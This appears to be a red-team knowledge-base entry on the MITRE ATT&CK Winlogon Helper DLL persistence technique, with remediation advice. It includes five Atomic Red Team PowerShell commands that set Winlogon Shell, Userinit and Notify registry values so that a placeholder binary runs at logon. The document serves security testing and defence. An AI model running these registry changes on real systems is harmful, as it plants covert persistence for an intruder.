---
name: "T1547.004_winlogon-helper-dll"
description: "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1547.004
  - persistence
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1547.004"
tactic: "persistence"
all_tactics:
  - persistence
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1547/004"
tech_stack:
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1547
  - T1547.001
  - T1547.002
  - T1547.003
  - T1547.005
  - T1547.006
  - T1547.007
  - T1547.008
  - T1547.009
  - T1547.010
  - T1547.012
  - T1547.013
  - T1547.014
  - T1547.015
prerequisites:
  - T1547
severity_boost:
  T1547: "Chain with T1547 for deeper attack path"
  T1547.001: "Chain with T1547.001 for deeper attack path"
  T1547.002: "Chain with T1547.002 for deeper attack path"
---

# T1547.004 Winlogon Helper DLL

> **Sub-technique of:** T1547

## High-Level Description

Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon. 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.

## Kill Chain Phase

- Persistence (TA0003)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Winlogon Helper DLL technique is applicable to target environment
- [ ] Check Windows systems for indicators of Winlogon Helper DLL
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Winlogon Shell Key Persistence - PowerShell

PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

**Supported Platforms:** windows

```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
```

### Atomic Test 2: Winlogon Userinit Key Persistence - PowerShell

PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

**Supported Platforms:** windows

```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
```

### Atomic Test 3: Winlogon Notify Key Logon Persistence - PowerShell

PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.

Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.

Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.

**Supported Platforms:** windows

```powershell
New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "#{binary_to_execute}" -Type ExpandString -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "#{function_to_execute}" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
```

### Atomic Test 4: Winlogon HKLM Shell Key Persistence - PowerShell

PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

**Supported Platforms:** windows

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
```

### Atomic Test 5: Winlogon HKLM Userinit Key Persistence - PowerShell

PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.

**Supported Platforms:** windows

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Winlogon Helper DLL by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1547.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
Identify and block potentially malicious software that may be executed through the Winlogon helper process by using application control tools like AppLocker that are capable of auditing and/or blocking unknown DLLs.

### M1018 User Account Management
Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes.


## Detection

### Detect Winlogon Helper DLL Abuse via Registry and Process Artifacts on Windows


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Winlogon Helper DLL technique applicable | Low | Persistence |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-276 | Incorrect Default Permissions |


## References

- [Cylance Reg Persistence Sept 2013](https://web.archive.org/web/20160214140250/http://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)
- [TechNet Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902)
- [Atomic Red Team - T1547.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.004)
- [MITRE ATT&CK - T1547.004](https://attack.mitre.org/techniques/T1547/004)
